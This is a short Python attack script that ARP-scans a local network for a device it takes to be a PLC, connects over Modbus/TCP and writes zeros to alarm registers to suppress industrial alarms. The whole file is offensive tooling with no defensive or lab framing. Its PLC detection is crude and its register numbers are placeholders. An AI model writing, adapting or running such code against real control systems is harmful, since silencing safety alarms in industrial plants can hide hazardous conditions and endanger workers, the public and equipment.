from scapy.all import ARP, Ether, srp
from pymodbus.client.sync import ModbusTcpClient
import time

# Discover PLC’s IP address on the network
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning for PLC on the network...")
    arp_request = ARP(pdst=network_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list, _ = srp(arp_request_broadcast, timeout=2, verbose=False)

    for sent, received in answered_list:
        if "PLC" in received.summary():  # Assumption: Identify PLC by vendor/manufacturer
            print(f"[+] PLC found: {received.psrc}")
            return received.psrc

    print("[-] No PLC found on network.")
    return None

# Connect to PLC and modify alarm registers (assuming Modbus/TCP)
def suppress_alarms(plc_ip, alarm_registers=[1000, 1001]):  # Change based on actual PLC config
    try:
        client = ModbusTcpClient(plc_ip)
        if not client.connect():
            print("[-] Failed to connect to PLC.")
            return

        print(f"[+] Connected to PLC at {plc_ip}")

        for reg in alarm_registers:
            client.write_register(reg, 0)  # Reset alarm registers to suppress alarms
            print(f"[+] Alarm register {reg} suppressed (set to 0).")

        client.close()
        print("[+] Alarm suppression completed.")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        suppress_alarms(plc_ip)
    else:
        print("[-] Could not find PLC. Exiting.")